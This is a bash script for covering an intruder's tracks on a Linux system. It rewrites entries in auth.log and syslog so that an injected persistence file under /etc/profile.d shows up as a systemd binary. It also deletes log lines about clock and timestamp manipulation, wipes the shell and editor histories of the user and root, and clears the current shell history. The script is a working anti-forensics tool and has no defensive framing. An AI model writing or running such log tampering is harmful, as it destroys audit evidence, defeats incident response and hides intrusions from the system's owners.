#!/bin/bash

# 1. Scrub System Logs
# Replaces sensitive file paths with generic system tasks and removes time-jump entries
LOGS=("/var/log/auth.log" "/var/log/syslog")
for log in "${LOGS[@]}"; do
    if [ -f "$log" ]; then
        # Replace the injected file path with a boring system binary path
        sed -i 's|/etc/profile.d/bash_completion.sh|/usr/lib/systemd/systemd-update|g' "$log"
        # Wipe all traces of time manipulation and timestamp spoofing
        sed -i '/systemd-timedated/d' "$log"
        sed -i '/date -s/d' "$log"
        sed -i '/touch -/d' "$log"
        sed -i '/timedatectl/d' "$log"
        sed -i '/LC_KEY/d' "$log"
    fi
done

# 2. Wipe Editor & Viewer Metadata
# Clears history for nano, vim, and less for both the current user and root
for user_home in "$HOME" "/root"; do
    rm -f "$user_home/.nano_history" "$user_home/.viminfo" "$user_home/.lesshst" "$user_home/.bash_history" 2>/dev/null
done

# 3. Session Cleanup
# Remove the hushlogin file so the next login prompt looks standard
rm -f ~/.hushlogin 2>/dev/null

# 4. Final Memory Flush
# Clear the current shell's command memory
history -c
